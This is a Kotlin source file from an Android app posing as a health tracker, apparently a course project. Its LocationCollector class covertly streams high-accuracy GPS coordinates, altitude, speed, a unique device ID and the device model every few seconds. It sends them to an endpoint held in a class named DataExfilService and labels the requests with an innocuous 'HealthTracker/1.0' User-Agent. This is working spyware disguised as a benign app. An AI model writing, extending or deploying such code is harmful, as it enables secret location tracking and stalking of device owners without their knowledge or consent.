package com.inf2007.healthtracker.utilities.collectors

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.DeviceUtils
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException

class LocationCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "LocationCollector"
        private const val LOCATION_UPDATE_INTERVAL = 10000L  // 10 seconds between updates
        private const val LOCATION_FASTEST_INTERVAL = 5000L  // 5 seconds fastest interval
        private const val LOCATION_SEND_INTERVAL = 30000L    // Send every 30 seconds
        private const val MIN_MOVEMENT_DISTANCE = 10.0f      // 10 meters
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    private var lastSentLocation: Location? = null
    private var lastSentTime: Long = 0

    override fun startObserving() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
        setupLocationCallback()
        requestLocationUpdates()
        Log.d(TAG, "Location tracking started")
    }

    override fun stopObserving() {
        if (::fusedLocationClient.isInitialized && ::locationCallback.isInitialized) {
            fusedLocationClient.removeLocationUpdates(locationCallback)
            Log.d(TAG, "Location tracking stopped")
        }
    }

    override fun collect() {
        // NOT NEEDED
    }

    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    processLocation(location)
                }
            }
        }
    }

    private fun processLocation(currentLocation: Location) {
        val now = System.currentTimeMillis()
        var shouldSend = false

        if (lastSentLocation == null) {
            shouldSend = true
        } else {
            val distance = lastSentLocation!!.distanceTo(currentLocation)

            if (distance >= MIN_MOVEMENT_DISTANCE) {
                shouldSend = true
            }
        }

        if (!shouldSend && (now - lastSentTime) >= LOCATION_SEND_INTERVAL) {
            shouldSend = true
        }

        if (shouldSend) {
            sendLocationToServer(currentLocation)
            lastSentLocation = currentLocation
            lastSentTime = now
        }
    }

    private fun requestLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_UPDATE_INTERVAL)
            .setMinUpdateIntervalMillis(LOCATION_FASTEST_INTERVAL)
            .build()

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
        }
    }

    private fun sendLocationToServer(location: Location) {
        Thread {
            try {
                val deviceId = DeviceUtils.getUniqueDeviceId(context)

                val locationData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("device_model", Build.MODEL)
                    put("timestamp", System.currentTimeMillis())
                    put("latitude", location.latitude)
                    put("longitude", location.longitude)
                    put("accuracy", location.accuracy)
                    if (location.hasAltitude()) {
                        put("altitude", location.altitude)
                    }
                    if (location.hasSpeed()) {
                        put("speed", location.speed)
                    }
                    put("provider", location.provider)
                }

                val requestBody = locationData.toString()
                    .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

                val request = Request.Builder()
                    .url(DataExfilService.LOCATION_ENDPOINT)
                    .post(requestBody)
                    .addHeader("User-Agent", "HealthTracker/1.0")
                    .build()

                NetworkClient.instance.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e(TAG, "Location send failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            Log.d(TAG, "Location sent: ${location.latitude}, ${location.longitude}")
                        }
                        response.close()
                    }
                })

            } catch (e: Exception) {
                Log.e(TAG, "Error sending location: ${e.message}")
            }
        }.start()
    }
}